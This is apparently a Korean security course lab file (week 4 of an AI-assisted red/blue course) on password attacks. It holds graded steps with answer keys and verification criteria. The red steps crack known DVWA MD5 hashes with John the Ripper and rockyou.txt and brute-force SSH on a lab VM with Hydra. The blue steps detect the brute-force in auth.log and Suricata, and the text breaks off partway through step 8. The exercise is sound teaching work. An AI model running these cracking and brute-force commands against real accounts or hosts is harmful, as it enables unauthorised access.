lab_id: battle-ai-week04
title: 패스워드 공격 — 크래킹, 브루트포스, 스프레이 (AI 지원)
version: ai
course: battle-ai
week: 4
description: 1세트 인프라에서 Red/Blue 역할을 번갈아 수행한다. Red Phase에서 패스워드 해시 크래킹과 온라인 브루트포스를
  수행하고, Blue Phase에서 브루트포스 공격을 탐지하고 차단한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: medium
duration_minutes: 120
objectives:
- 해시 크래킹 도구(John, Hashcat)를 활용한 오프라인 공격을 수행한다
- Hydra를 이용한 온라인 브루트포스 공격을 실습한다
- Blue 관점에서 브루트포스를 탐지하고 차단한다
prerequisites:
- 해시 함수 기초 (MD5, SHA)
- Linux 인증 구조
infra_requirements:
- attacker VM (10.20.30.201)
- secu VM (10.20.30.1) — nftables, suricata
- web VM (10.20.30.80) — apache, modsecurity, JuiceShop(:3000), DVWA(:8080)
- siem VM (10.20.30.100) — wazuh-manager
pass_threshold: 0.6
steps:
- order: 1
  instruction: '[RED] 다양한 해시 유형(MD5, SHA1, SHA256)의 샘플 해시를 생성하라.'
  hint: echo -n과 md5sum, sha1sum, sha256sum을 사용한다.
  category: analysis
  points: 5
  answer: '🤖 프롬프트: [RED] 다양한 해시 유형(MD5, SHA1, SHA256)의 샘플 해시를 생성해줘

    📎 참고 (CLI): echo -n ''password123'' | md5sum && echo -n ''password123'' | sha1sum
    && echo -n ''password123'' | sha256sum'
  answer_detail: 같은 평문이라도 해시 알고리즘에 따라 완전히 다른 해시값이 생성된다. MD5는 32자, SHA1은 40자, SHA256은
    64자의 16진수 문자열을 출력한다.
  verify:
    type: output_contains
    expect: 482c811da5d5b4bc6d497ffa98491e38
    field: stdout
    semantic:
      intent: '[RED] 3가지 해시 알고리즘 비교 — echo -n password123 | md5sum·sha1sum·sha256sum
        동일 평문으로 MD5(32자)·SHA1(40자)·SHA256(64자) 16진 해시 생성. 같은 입력이어도 알고리즘별 완전히 다른 출력.
        482c811da5d5b4bc6d497ffa98491e38 = password123 의 MD5'
      success_criteria:
      - echo -n + md5sum/sha1sum/sha256sum 3개 해시 생성
      - password123 의 MD5 = 482c811da5d5b4bc6d497ffa98491e38 검증 가능
      - 알고리즘별 출력 길이 차이 인지
      acceptable_methods:
      - echo -n <pw> | <algo>sum
      - openssl dgst -md5/-sha1/-sha256
      - python3 -c import hashlib; ...
      - sha256sum <file>
      negative_signs:
      - echo 에 -n 없음 (뉴라인 포함 → 다른 해시)
      - 알고리즘 1개만 비교
      - 해시 길이/형식 설명 없음
  target_vm: attacker
  script: echo -n 'password123' | md5sum && echo -n 'password123' | sha1sum && echo
    -n 'password123' | sha256sum
  risk_level: low
  bastion_prompt: '[RED] 다양한 해시 유형(MD5, SHA1, SHA256)의 샘플 해시를 생성해줘'
- order: 2
  instruction: '[RED] Week 3에서 추출한 DVWA 사용자 패스워드 해시를 John the Ripper용 파일로 준비하라.'
  hint: user:hash 형식의 파일을 생성한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] Week 3에서 추출한 DVWA 사용자 패스워드 해시를 John the Ripper용 파일로 준비해줘

    📎 참고 (CLI): cat > /tmp/dvwa_hashes.txt << ''EOF''

    admin:5f4dcc3b5aa765d61d8327deb882cf99

    gordonb:e99a18c428cb38d5f260853678922e03

    pablo:0d107d09f5bbe40cade3de5c71e9e9b7

    smithye:5f4dcc3b5aa765d61d8327deb882cf99

    EOF'
  answer_detail: John the Ripper는 user:hash 형식의 입력을 기대한다. DVWA의 패스워드 해시는 MD5(unsalted)로,
    현대 기준으로는 매우 취약하다.
  verify:
    type: file_exists
    expect: /tmp/dvwa_hashes.txt
    field: filesystem
    semantic:
      intent: '[RED] John the Ripper 입력 포맷 준비 — /tmp/dvwa_hashes.txt 에 user:hash 형식으로
        4명 사용자(admin/gordonb/pablo/smithye)의 MD5 unsalted 해시 저장. DVWA 의 알려진 약한 해시.
        5f4dcc3b5aa765d61d8327deb882cf99 = password 라는 유명 해시 포함'
      success_criteria:
      - /tmp/dvwa_hashes.txt 파일 생성
      - user:hash 형식의 줄 최소 3개
      - MD5 해시 (32자 16진) 포함
      acceptable_methods:
      - cat > file << EOF heredoc
      - echo user:hash >> file
      - python으로 파일 작성
      - awk 로 DB dump 파싱 후 포맷 변환
      negative_signs:
      - hash 만 (user 없음) — john 포맷 미스매치
      - 평문 저장
      - MD5 이외 알고리즘 사용
  target_vm: attacker
  script: 'cat > /tmp/dvwa_hashes.txt << ''EOF''

    admin:5f4dcc3b5aa765d61d8327deb882cf99

    gordonb:e99a18c428cb38d5f260853678922e03

    pablo:0d107d09f5bbe40cade3de5c71e9e9b7

    smithye:5f4dcc3b5aa765d61d8327deb882cf99

    EOF'
  risk_level: medium
  bastion_prompt: '[RED] Week 3에서 추출한 DVWA 사용자 패스워드 해시를 John the Ripper용 파일로 준비해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 3
  instruction: '[RED] John the Ripper의 기본 워드리스트로 해시 크래킹을 시도하라.'
  hint: john 명령에 --format=raw-md5 옵션을 지정한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] John the Ripper의 기본 워드리스트로 해시 크래킹을 시도해줘

    📎 참고 (CLI): john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
    /tmp/dvwa_hashes.txt'
  answer_detail: John the Ripper는 워드리스트의 각 단어를 해시하여 대상 해시와 비교한다. rockyou.txt는 1,400만개
    이상의 실제 유출 패스워드를 포함한다.
  verify:
    type: output_contains
    expect: Loaded
    field: stdout
    semantic:
      intent: '[RED] John the Ripper MD5 사전 공격 — john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
        /tmp/dvwa_hashes.txt. rockyou.txt 의 1,400만 개 유출 패스워드를 각각 MD5 해시해 대상 해시와 매칭.
        Loaded N password hashes 로딩 확인 + 크래킹 진행'
      success_criteria:
      - john --format=raw-md5 명령 실행
      - --wordlist=rockyou.txt 또는 유사 대형 사전
      - Loaded 또는 크래킹 진행 메시지
      acceptable_methods:
      - john --format=raw-md5 --wordlist=rockyou.txt file
      - hashcat -m 0 (raw MD5) hash.txt rockyou.txt
      - john --incremental 순차 브루트포스
      - CeWL 로 맞춤 워드리스트 생성
      negative_signs:
      - --format 누락 (john 이 hash 타입 추측)
      - wordlist 없이 incremental 만
      - rockyou 이외 매우 작은 사전
  target_vm: attacker
  script: john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/dvwa_hashes.txt
  risk_level: medium
  bastion_prompt: '[RED] John the Ripper의 기본 워드리스트로 해시 크래킹을 시도해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 4
  instruction: '[RED] 크래킹 결과를 확인하라.'
  hint: john --show 옵션을 사용한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] 크래킹 결과를 확인해줘

    📎 참고 (CLI): john --show --format=raw-md5 /tmp/dvwa_hashes.txt'
  answer_detail: --show 옵션은 이미 크래킹된 해시의 결과를 표시한다. password, abc123, letmein 등 약한 패스워드가
    즉시 크래킹된다.
  verify:
    type: output_contains
    expect: password
    field: stdout
    semantic:
      intent: '[RED] john --show 크래킹 결과 조회 — john --show --format=raw-md5 /tmp/dvwa_hashes.txt
        로 ~/.john/john.pot 에 저장된 복호화 결과 출력. admin:password, gordonb:abc123 등 약한 패스워드
        공개. password 키워드 확인으로 성공 검증'
      success_criteria:
      - john --show 명령 실행
      - password 키워드 또는 평문 결과 출력
      - user:cleartext 형식의 크래킹 결과
      acceptable_methods:
      - john --show --format=raw-md5 file
      - cat ~/.john/john.pot 직접 조회
      - hashcat --show -m 0 hash.txt
      - john --show=left 미크래킹 해시 조회
      negative_signs:
      - --show 없이 크래킹 재실행
      - 크래킹 결과 없음 (john 미실행)
      - password 키워드 없음
  target_vm: attacker
  script: john --show --format=raw-md5 /tmp/dvwa_hashes.txt
  risk_level: medium
  bastion_prompt: '[RED] 크래킹 결과를 확인해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 5
  instruction: '[RED] Hydra를 사용하여 web 서버 SSH 서비스에 온라인 브루트포스를 수행하라.'
  hint: hydra -l user -P wordlist ssh://target 형식을 사용한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] Hydra를 사용하여 web 서버 SSH 서비스에 온라인 브루트포스를 수행해줘

    📎 참고 (CLI): hydra -l ccc -P /usr/share/wordlists/metasploit/unix_passwords.txt
    ssh://10.20.30.80 -t 4 -f -w 5'
  answer_detail: Hydra는 온라인 패스워드 브루트포스 도구이다. -t 4는 동시 연결 수, -f는 첫 번째 성공 시 중지한다. SSH는
    느리므로 스레드 수를 제한해야 한다.
  verify:
    type: output_contains
    expect: 'host:'
    field: stdout
    semantic:
      intent: '[RED] Hydra SSH 온라인 브루트포스 — hydra -l ccc -P unix_passwords.txt ssh://10.20.30.80
        -t 4 -f -w 5. 단일 사용자 ccc 대상 사전의 각 패스워드로 실제 SSH 로그인 시도. -t 4 (동시 4 연결, SSH
        부하 고려), -f (첫 성공 시 중지), -w 5 (5초 대기). 오프라인 크래킹과 달리 네트워크·타이밍·계정 잠금 제약'
      success_criteria:
      - hydra + ssh://<target> + -l user + -P wordlist
      - -t 스레드 + -f 조기 종료 + -w 타임아웃
      - 'host: 키워드 출력 (Hydra 성공 또는 완료 메시지)'
      acceptable_methods:
      - hydra -l user -P pw ssh://<target>
      - medusa -u user -P pw -M ssh -h <target>
      - ncrack -u user -P pw ssh://<target>
      - msf auxiliary/scanner/ssh/ssh_login
      negative_signs:
      - 오프라인 크래킹 (john) 재사용
      - -t 너무 높음 (SSH 거부)
      - 계정 잠금 위험 고려 없음
  target_vm: attacker
  script: hydra -l ccc -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.20.30.80
    -t 4 -f -w 5
  risk_level: medium
  bastion_prompt: '[RED] Hydra를 사용하여 web 서버 SSH 서비스에 온라인 브루트포스를 수행해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 6
  instruction: '[BLUE] auth.log에서 SSH 브루트포스 공격 흔적을 확인하라.'
  hint: grep으로 'Failed password'를 검색한다.
  category: defense
  points: 10
  answer: '🤖 프롬프트: [BLUE] auth.log에서 SSH 브루트포스 공격 흔적을 확인해줘

    📎 참고 (CLI): grep ''Failed password'' /var/log/auth.log | tail -20'
  answer_detail: auth.log의 'Failed password'는 SSH 로그인 실패를 나타낸다. 10.20.30.201에서 대량의
    실패 기록이 있으면 브루트포스 공격 증거이다.
  verify:
    type: output_contains
    expect: Failed
    field: stdout
    semantic:
      intent: '[BLUE] /var/log/auth.log SSH 로그인 실패 확인 — grep Failed password 로 sshd
        PAM 인증 실패 이벤트 추출. Hydra 브루트포스의 흔적은 짧은 시간 내 대량 Failed password from 10.20.30.201
        port XXXX ssh2 반복. tail -20 로 최근 기록 확인'
      success_criteria:
      - grep Failed password /var/log/auth.log 명령
      - Failed 키워드 포함 출력
      - 공격자 IP 또는 사용자 이름 반복 패턴 인지
      acceptable_methods:
      - grep Failed password auth.log
      - journalctl -u sshd --since 1h | grep Failed
      - lastb 로 bad login history
      - ausearch -m USER_AUTH (auditd)
      negative_signs:
      - auth.log 아닌 다른 로그 조회
      - Failed 키워드 없이 grep (결과 과다)
      - 시간 범위 없이 전체
  target_vm: web
  script: grep 'Failed password' /var/log/auth.log | tail -20
  risk_level: low
  bastion_prompt: '[BLUE] auth.log에서 SSH 브루트포스 공격 흔적을 확인해줘'
- order: 7
  instruction: '[BLUE] SSH 로그인 실패를 IP별로 집계하여 공격 IP를 식별하라.'
  hint: awk와 sort를 조합한다.
  category: defense
  points: 10
  answer: '🤖 프롬프트: [BLUE] SSH 로그인 실패를 IP별로 집계하여 공격 IP를 식별해줘

    📎 참고 (CLI): grep ''Failed password'' /var/log/auth.log | awk ''{print $(NF-3)}''
    | sort | uniq -c | sort -rn | head -10'
  answer_detail: awk로 IP 필드를 추출하고 sort | uniq -c | sort -rn으로 빈도 내림차순 정렬한다. 10.20.30.201이
    최상위 공격 IP로 나타나야 한다.
  verify:
    type: output_contains
    expect: 10.20.30
    field: stdout
    semantic:
      intent: '[BLUE] SSH 실패 공격 IP 집계 — grep Failed password auth.log | awk {print
        $(NF-3)} 로 IP 필드 추출 | sort | uniq -c | sort -rn | head -10. auth.log 포맷에서
        from <IP> port <PORT> ssh2 중 <IP> 가 NF-3 번째 필드. 공격자 IP top 10 식별'
      success_criteria:
      - grep Failed + awk 로 IP 필드 추출
      - sort | uniq -c | sort -rn 집계 파이프라인
      - 10.20.30 포함 IP 출력
      acceptable_methods:
      - grep + awk $(NF-3) + sort uniq -c
      - fail2ban-client status sshd 로 차단 IP 조회
      - pandas read_csv + value_counts
      - ELK aggregation 질의
      negative_signs:
      - IP 추출 실패 (awk 필드 오류)
      - 집계 없이 raw 출력
      - 공격자 식별 없음
  target_vm: web
  script: grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort
    | uniq -c | sort -rn | head -10
  risk_level: low
  bastion_prompt: '[BLUE] SSH 로그인 실패를 IP별로 집계하여 공격 IP를 식별해줘'
- order: 8
  instruction: '[BLUE] Suricata에서 SSH 브루트포스 탐지 알림을 확인하라.'
  hint: eve.json에서 SSH 관련 알림을 검색한다.
  category: defense
  points: 10
  answer: '🤖 프롬프트: [BLUE] Suricata에서 SSH 브루트포스 탐지 알림을 확인해줘

    📎 참고 (CLI): tail -100 /var/log/suricata/eve.json | jq -r ''select(.event_type=="alert"
    and (.alert.signature | test("SSH|brute"; "i"))) | "\(.timestamp) \(.alert.signature)"''
    2>/dev/null | tail -5 || grep -i ssh /var/log/suricata/fast.log | tail -5'
  answer_detail: Suricata는 SSH 연결 빈도를 기반으로 브루트포스를 탐지한다. threshold 설정에 따라 일정 횟수 이상의
    시도가 감지되면 알림이 발생한다.
  verify:
    type: output_contains
    expect:
    - 10.20.30
    - Suricata
    - active
    field: stdout
    semantic:
      intent: '[BLUE] Suricata SSH 브루트포스 경보 조회 — jq select(.event_type==alert and
        (.alert.signature | test(SSH|brute; i))) eve.json 으로 SSH 또는 brute 키워드 매칭 경보
        필터. threshold 설정으로 연결 빈도 기반 탐지. fallback 으로 fast.log grep -i ssh'
      success_criteria:
      - jq 로 alert + SSH/brute 패턴 필터 OR fast.log grep
      - 10.20.30 또는 공격자 IP 출력
      - threshold 기반 빈도 탐지 개념
      acceptable_methods:
      - jq select(.alert.signature | test(SSH; i)) eve.json
